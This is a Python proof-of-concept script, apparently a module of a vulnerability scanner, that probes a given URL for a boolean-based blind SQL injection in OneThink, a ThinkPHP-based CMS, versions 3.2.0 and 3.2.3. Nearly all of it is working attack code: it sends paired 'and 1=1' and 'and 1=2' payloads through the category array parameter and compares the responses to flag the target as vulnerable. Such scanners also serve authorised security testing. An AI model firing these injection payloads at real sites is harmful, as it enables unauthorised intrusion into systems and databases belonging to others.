#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: Onethink 参数category SQL注入
referer: http://www.wooyun.org/bugs/wooyun-2016-0176868
author: Lucifer
description: onethink是ThinkPHP的子版本的一种，漏洞位于Application/Home/Controller/ArticleController.class.php中,category数组存在bool型盲注入,
    影响版本ThinkPHP 3.2.0和3.2.3
'''
import sys
import requests
import warnings
sys.path.append('../../')
from color import *

class onethink_category_sqli:
    def __init__(self, url):
        self.url = url

    def run(self):
        reqlst = []
        payload1 = [r"/index.php?c=article&a=index&category[0]==0))+and+1=1%23between&category[1]=a", r"/index.php?c=article&a=index&category[0]==0))+and+1=2%23between&category[1]=a"]
        for payload in payload1:
            vulnurl = self.url + payload
            try:
                req = requests.get(vulnurl, timeout=10, verify=False)
                reqlst.append(str(req.text))
            except:
                printYellow("[-]Warning:"+self.__class__.__name__+" ==>可能不存在漏洞")
        if len(reqlst[0]) != len(reqlst[1]) and r"分类不存在或被禁用" in reqlst[1]: 
            printGreen("[+]Success:存在onethink3.2.0 SQL注入漏洞...(高危)\tpayload: "+vulnurl)

        reqlst = []
        payload2 = [r"/index.php?c=article&a=index&category[0]==0+and+1=1%23between&category[1]=a", r"/index.php?c=article&a=index&category[0]==0+and+1=2%23between&category[1]=a"]
        for payload in payload2:
            vulnurl = self.url + payload
            try:
                req = requests.get(vulnurl, timeout=10, verify=False)
                reqlst.append(str(req.text))

            except:
                printYellow("[-]Warning:"+self.__class__.__name__+" ==>可能不存在漏洞")
        if len(reqlst[0]) != len(reqlst[1]) and r"分类不存在或被禁用" in reqlst[1]: 
            printGreen("[+]Success:存在onethink3.2.3 SQL注入漏洞...(高危)\tpayload: "+vulnurl)
        else:
            printBlue("[-]Info:不存在onethink_category_sqli漏洞")



if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = onethink_category_sqli(sys.argv[1])
    testVuln.run()